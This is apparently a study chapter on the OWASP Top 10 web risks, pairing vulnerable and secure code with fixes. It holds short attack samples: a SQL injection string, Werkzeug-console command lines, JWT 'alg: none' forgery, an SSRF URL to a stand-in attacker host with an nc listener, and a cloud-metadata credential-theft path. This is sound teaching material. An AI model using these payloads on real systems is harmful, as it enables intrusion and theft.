# 🔟 2.2 OWASP Top 10 Masterclass

> [!abstract] The Masterclass
> The **OWASP Top 10** is the industry-standard catalogue of the most critical web application risks, ranked by prevalence and impact from real breach data. This chapter is the *framework* — each category explained with its root cause, a vulnerable-vs-secure example, an exploitation sketch, and the defensive fix. The *hands-on exploitation* lives in **Web Exploitation**; the *API-specific* variants in **API Security**. **`#level/apprentice`**

> [!warning] Authorized Vulnerability-Assessment context
> This catalogue is a **defensive architecture testing** reference. Each entry is framed as "here is the weakness, here is how an authorized assessor demonstrates it, here is how you remediate it."

## A01 Broken Access Control

**#1 by prevalence.** Access control enforces *what an authenticated user is allowed to do*. It's **broken** when a user can act outside their intended permissions — the gap between **authentication** ("who are you?") and **authorization** ("what may you do?").

![[Pasted image 20251107162932.png]]

Failure modes an assessor tests:
- **Horizontal** — reach another user's data at the same privilege level (**IDOR**).
- **Vertical** — reach higher-privilege functions (a normal user hitting `/admin`).
- **Forced browsing** — navigate straight to a protected URL that's merely *unlinked*, not *protected*.
- **Parameter/method tampering** — `?admin=true`, or a `DELETE` where only `GET` was expected.

The canonical case is **IDOR (Insecure Direct Object Reference)** — the app exposes an object identifier and trusts it:
```
https://bank.thm/account?id=111111     ← my account
https://bank.thm/account?id=222222     ← change the id → someone else's account
```
If the server returns account `222222` without checking it belongs to *me*, that's broken access control. Full exploitation: **Web Exploitation (IDOR)**; the API-native form is **BOLA**.

> **Secure design:** enforce authorization **server-side on every request**, keyed to the session identity — never trust a client-supplied ID or hidden field. **Deny by default**, use indirect/unpredictable references, centralise the checks (not scattered per-controller), and log access-control failures (****).

---

## A02 Cryptographic Failures

Formerly "Sensitive Data Exposure." Failures in protecting data **in transit** and **at rest**: no/weak TLS, broken algorithms (MD5, SHA1, DES, ECB mode), hard-coded keys, and — the most common — **fast, unsalted password hashes**.

```python
# ❌ Vulnerable — a fast, unsalted hash (crackable at billions/sec on a GPU)
import hashlib
stored = hashlib.md5(password.encode()).hexdigest()

# ✅ Secure — a slow, salted, memory-hard KDF
import bcrypt
stored = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# verify:
bcrypt.checkpw(attempt.encode(), stored)
```
Why it matters: once a DB is dumped, MD5 password hashes fall to `hashcat` in minutes against `rockyou.txt`; bcrypt/argon2 make the same crack economically infeasible. In transit, missing HSTS enables the `sslstrip` downgrade from **Secure Protocols**.

> **Secure design:** TLS 1.2+ everywhere with **HSTS**; a modern password KDF (**argon2id / bcrypt / scrypt**) with per-user salt; authenticated encryption (**AES-GCM**, never ECB) for data at rest; secrets in a vault or KMS, never in source or config committed to git.

---

## A03 Injection

Untrusted input is interpreted as **code/commands** by a downstream interpreter — SQL, OS shell, LDAP, template engines, NoSQL, XPath. The root cause is always identical: **data and code concatenated into one string.**
```php
// ❌ Vulnerable — user input becomes part of the SQL
$q = "SELECT * FROM users WHERE name = '$name'";
// Input:  name = ' OR '1'='1   → returns every row
// ✅ Secure — parameterised; the driver keeps data and code separate
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$name]);
```
This entire family — **SQLi**, **command injection**, **LDAP**, **SSTI**, **XXE** — is exploited hands-on in **Web Exploitation**. **Fix:** parameterisation/prepared statements, allow-list input validation, context-safe APIs (ORMs used correctly), and least-privilege interpreter accounts so a successful injection yields little.

---

## A04 Insecure Design

A *structural* flaw — the system is insecure **by design**, not by a coding bug. No amount of perfect implementation fixes a *missing* control. Examples: a password-reset flow with no rate limit; a checkout that trusts a client-supplied `price` field; a "security question" recoverable from public data; a workflow with no anti-automation.

The distinction from **** matters: misconfiguration is a control that *exists but is set wrong*; insecure design is a control that *was never there*. You can't patch your way out of it.

> **Secure design:** **threat-model** during design, write **abuse-cases** alongside use-cases ("how would an attacker misuse this?"), use established secure design patterns, enforce business-logic limits server-side, and build security requirements in from the start — shift left.

---

## A05 Security Misconfiguration

The system *could* have been secured but wasn't: default credentials, unnecessary features/ports/accounts enabled, verbose error messages/stack traces, missing [security headers](https://owasp.org/www-project-secure-headers/), permissive CORS, and — dangerously — **exposed debug interfaces**.

![[Pasted image 20251107182407.png]]

The 2015 **Patreon** breach came from an exposed **Werkzeug debug console** (reachable at `/console`, or auto-shown on an unhandled exception), which runs arbitrary Python:
```python
import os; print(os.popen("ls -l").read())     # RCE via a forgotten debugger
import os; os.popen("id").read()                 # confirm the web user
```
A single left-on `DEBUG=True` becomes remote code execution. Other staples: `admin/admin` on a mgmt panel, a directory listing exposing backups, or a stack trace revealing the framework, version, and file paths.

> **Secure design:** harden a **repeatable baseline** (infrastructure-as-code), disable debug/default accounts in production, minimise the feature/port surface, return **generic errors**, and ship the full set of security headers (CSP, HSTS, X-Content-Type-Options, X-Frame-Options).

---

## A06 Vulnerable and Outdated Components

Modern apps are built on hundreds of third-party libraries; you inherit every one of their CVEs. A single known-vulnerable dependency — Log4Shell (`log4j` CVE-2021-44228), an old jQuery, an unpatched Struts or CMS plugin — is often the whole breach.
```bash
npm audit            # Node
pip-audit            # Python
trivy image myapp    # container image CVEs
grype dir:.          # filesystem/SBOM scan
```
The challenge is *transitive* dependencies (a library your library uses) and *reachability* (is the vulnerable code path actually used?). Log4Shell was devastating precisely because a ubiquitous logging library, three dependencies deep, could be triggered by a crafted string in any logged field.

> **Secure design:** maintain a **Software Bill of Materials (SBOM)**, patch continuously (Dependabot/Renovate), remove unused dependencies, pin versions, and monitor CVE feeds for everything you ship.

---

## A07 Identification and Authentication Failures

Weaknesses in verifying *who* the user is: brute-forceable logins, weak/credential-stuffed passwords, predictable or non-rotated session tokens, and broken account-management logic.

![[Pasted image 20251107201201.png]]

Authentication issues an assessor probes:
- **Brute force / credential stuffing** — no lockout or rate limit on login; test with **hydra**.
- **Weak session cookies** — predictable/sequential IDs let an attacker set their own; no rotation after login enables **session fixation**.
- **Registration logic flaws** — e.g. **re-registration of an existing user** with a leading space (`" admin"`); if the app trims/collides names inconsistently, the second account can inherit the real `admin`'s context.

> **Secure design:** strong password policy, **account lockout / rate limiting** on login, ****MFA****, high-entropy session tokens **rotated on login**, canonicalise usernames, and secure the whole reset/recovery flow. JWT-specific failures: **Web Fundamentals (JWT Security)**.

---

## A08 Software and Data Integrity Failures

Trusting code or data whose **integrity you can't verify** — a category that grew with CI/CD and CDN-delivered dependencies (it covers software-supply-chain attacks like SolarWinds).

**Software integrity** — pulling a library from an external CDN with no integrity check. If the CDN (or the library's repo) is compromised, every visitor executes the injected code:
```html
<!-- ❌ No integrity check — trusts the CDN blindly -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<!-- ✅ Subresource Integrity: the browser runs it ONLY if the file's hash matches -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"
        integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
        crossorigin="anonymous"></script>
```
![[Pasted image 20251107212452.png]]

**Data integrity** — trusting client-tamperable data. Storing a raw `username` in a cookie lets a user rewrite it and impersonate anyone:

![[Pasted image 20251107212829.png]]

The fix is an integrity-protected token — a **JWT**, whose signature (keyed by a server-only secret) proves the payload wasn't altered:

![[Pasted image 20251107213223.png]]

But JWTs introduce their own integrity failure — the **`alg: none`** downgrade: set `alg` to `none`, drop the signature, and vulnerable libraries accept it, letting you forge `"admin":true`:

![[Pasted image 20251107213607.png]]

> **Secure design:** **SRI** for external scripts, **signed & verified** update/CI pipelines and container images, digital signatures on serialized data, and never trust client-side data for authorization. Full JWT attack set: **Web Fundamentals (JWT Security)**; deserialization: **Web Exploitation (Insecure Deserialisation)**.

---

## A09 Security Logging and Monitoring Failures

You can't respond to what you can't see. Missing or insufficient logging of authentication events, access-control failures, and high-value actions means breaches dwell undetected for months (industry median: **~200+ days**).

What *should* be logged: login success/failure, access-control denials, input-validation failures, and all high-value transactions — with enough context (who, what, when, from where) to reconstruct an attack, but **without** logging secrets/passwords/tokens themselves.

> **Secure design:** log security-relevant events with context; **forward off-host** to a tamper-resistant SIEM (so an attacker who owns the box can't erase the trail — mirrors **host logging**); alert on anomalies (spikes of failed logins, access-control denials, log-clearing); and rehearse incident response so the alerts actually get actioned.

---

## A10 Server-Side Request Forgery

**SSRF** coerces the *server* into making attacker-chosen requests — reaching internal services the attacker can't touch directly, because the request originates from inside the trust boundary.

![[Pasted image 20251107222034.png]]

Classic case — a `server`/`url` parameter the app forwards to:
```
https://mysite.com/sms?server=attacker.thm&msg=ABC
→ the server makes:  https://attacker.thm/api/send?msg=ABC   (leaking the API key)
```
```bash
nc -lvp 80      # catch the forwarded request (and any secrets/headers it carries)
```
SSRF escalates far beyond a leaked key: **enumerate internal networks/ports**, hit **cloud metadata** (`http://169.254.169.254/latest/meta-data/…`) to steal IAM credentials, reach internal admin panels, and interact with non-HTTP services (Redis, gopher://) for RCE. Full exploitation, including filter bypasses: **Web Exploitation (Server-Side Request Forgery (SSRF))**.

> **Secure design:** **allow-list** permitted destinations (not a deny-list of "bad" ones), block requests to internal/link-local ranges (`169.254.0.0/16`, RFC 1918), disable unused URL schemes, never reflect raw responses to the user, and require IMDSv2 on cloud metadata.
